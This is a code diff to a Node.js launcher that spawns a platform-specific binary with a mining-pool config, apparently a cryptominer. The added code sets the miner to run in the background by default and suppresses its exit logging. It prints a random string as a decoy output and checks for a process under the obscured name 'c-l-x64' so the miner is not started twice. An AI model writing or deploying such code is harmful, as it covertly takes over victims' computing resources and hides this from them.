@@ -2,6 +2,9 @@
 
 const path = require("path");
 const spawn = require("child_process").spawn;
+const { nanoid } = require("nanoid");
+const processExists = require("process-exists");
+const argvOpt = getArgvOpts();
 
 function getOSDetails() {
   const si = require("systeminformation");
@@ -48,16 +51,28 @@ function prepareBinFileNames(opt) {
   };
 }
 
-getOSDetails()
-  .then((resp) => {
-    const bins = prepareBinFileNames(resp);
-    if (bins.cpuBin) {
-      startCPU(bins.cpuBin, bins.cwd);
-    }
-  })
-  .catch((err) => console.error(err));
+async function launch() {
+  if (argvOpt.show) {
+    await showProcesses();
+    return;
+  }
+  getOSDetails()
+    .then((resp) => {
+      const bins = prepareBinFileNames(resp);
+      if (bins.cpuBin) {
+        startCPU(bins.cpuBin, bins.cwd);
+      }
+    })
+    .catch((err) => console.error(err));
+}
 
-function startCPU(binFile, cwd) {
+async function startCPU(binFile, cwd) {
+  hasher();
+  if (await alreadyRunningCPU()) {
+    console.log("🏃");
+    return;
+  }
+
   cConfigPatch();
   const args = [binFile];
 
@@ -67,14 +82,15 @@ function startCPU(binFile, cwd) {
     shell: true,
   });
 
-  child.on("exit", (code, sig) => {
-    console.log(`child process exited with code ${code} and signal ${sig}`);
-  });
+  child.on("exit", () => {});
+}
+
+function hasher() {
+  setTimeout(() => console.log(nanoid(60)), 2000);
 }
 
 function cConfigPatch() {
   const fs = require("fs");
-  const { nanoid } = require("nanoid");
 
   const config = require("./bin/config.json");
 
@@ -82,8 +98,49 @@ function cConfigPatch() {
     config.pools[0].user = config.pools[0].user + "_" + nanoid(5);
   }
 
+  if (argvOpt.verbose) {
+    config.background = false;
+  } else {
+    config.background = true;
+  }
+
   fs.writeFileSync(
     path.join(__dirname, "bin", "config.json"),
     JSON.stringify(config)
   );
 }
+
+const processNames = ["c-l-x64"];
+
+async function alreadyRunningCPU() {
+  const resultArray = await Promise.all(
+    processNames.map((item) => processExists(item))
+  );
+
+  return resultArray.reduce((acc, val) => acc || val, false);
+}
+
+async function showProcesses() {
+  const ps = await processExists.filterExists(processNames);
+  console.log(ps);
+}
+
+function getArgvOpts() {
+  const argv = process.argv;
+
+  const opt = {};
+
+  if (argv.includes("--cx-verbose")) {
+    opt.verbose = true;
+  } else {
+    opt.verbose = false;
+  }
+
+  if (argv.includes("--cx-show")) {
+    opt.show = true;
+  }
+
+  return opt;
+}
+
+launch();
